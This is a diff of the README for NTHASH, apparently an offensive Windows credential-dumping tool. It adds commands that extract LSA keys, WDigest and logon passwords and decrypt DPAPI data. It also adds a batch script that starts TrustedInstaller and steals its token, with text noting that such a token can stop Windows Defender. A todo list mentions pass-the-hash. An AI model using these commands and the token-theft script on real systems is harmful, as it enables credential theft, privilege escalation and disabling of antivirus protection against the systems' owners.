@@ -14,9 +14,14 @@ NTHASH /getusers [/server:hostname] <br/>
 NTHASH /getdomains [/server:hostname <br/>
 NTHASH /dumpsam <br/>
 NTHASH /dumphashes [/offline] <br/>
-NTHASH /dumphash /rid:500 [/offline] <br/>
+NTHASH /dumphash /rid:123 [/offline] <br/>
 NTHASH /getsamkey [/offline] <br/>
 NTHASH /getsyskey [/offline] <br/>
+NTHASH /getlsakeys <br/>
+NTHASH /wdigest <br/>
+NTHASH /logonpasswords <br/>
+NTHASH /cryptunprotectdata /input:filename <br/>
+NTHASH /cryptprotectdata /input:string <br/>
 NTHASH /runasuser /user:username /password:password [/binary: x:\folder\bin.exe] <br/>
 NTHASH /runastoken /pid:12345 [/binary: x:\folder\bin.exe] <br/>
 NTHASH /runaschild /pid:12345 [/binary: x:\folder\bin.exe] <br/>
@@ -47,6 +52,17 @@ https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-change
 Once under a system account, you can also "steal" a token from trustedinstaller (net start trustedinstaller before hand. <br/>
 Note that you can steal a trustedinstaller token directly by using the /system switch. <br/>
 With a trustedinstaller token, you can perform actions like stop windefend (or kill the process, or modify the AV settings, etc). <br/>
+See example below where you would start the trustedinstaller service, retrieve its pid and run a process as the account. <br/>
+<i>
+@echo off <br/>
+net start trustedinstaller <br/>
+for /F "tokens=1" %%K in ('
+   nthash-win64 /enumproc ^| findstr /i "trustedinstaller"
+') do (
+   nthash-win64 /runastoken /pid:%%K /system
+)
+<br/>
+  </i>
 
 <b>runaschild</b> can be used to run a process as a child of another existing/parent process. <br/>
 Note that some apps (like cmd.exe) will crash right after initialization with a c0000142. <br/>
@@ -55,6 +71,6 @@ Wierdly enough, loading notepad.exe with this method and then launching cmd.exe 
 todo: <br/>
 -decrypt sam hashes online (rather than patching lsass) and offline : done in v1.1 <br/>
 -deal with new AES cipher used in latest win10 1607 : done in 1.2 <br/>
--enum Lsasrv.dll!LogonSessionList <br/>
--enum Wdigest.dll!l_LogSessList <br/>
+-enum Lsasrv.dll!LogonSessionList: done in 1.3 <br/>
+-enum Wdigest.dll!l_LogSessList: done in 1.3 <br/>
 -patch LogonSessionList and perform pth? <br/>
